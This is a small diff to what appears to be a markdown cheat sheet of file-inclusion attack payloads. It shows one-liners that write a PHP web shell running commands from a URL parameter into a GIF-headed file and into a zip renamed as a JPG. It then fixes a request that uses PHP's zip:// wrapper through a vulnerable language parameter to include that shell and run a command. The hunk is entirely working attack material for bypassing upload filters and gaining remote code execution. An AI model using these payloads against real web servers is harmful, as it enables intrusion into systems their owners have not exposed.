@@ -562,7 +562,7 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
 ```
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
-/index.php?language=zip://shell.zip%23shell.php&cmd=id
+/index.php?language=zip://shell.jpg%23shell.php&cmd=id
 ```
 
 #### shell.php
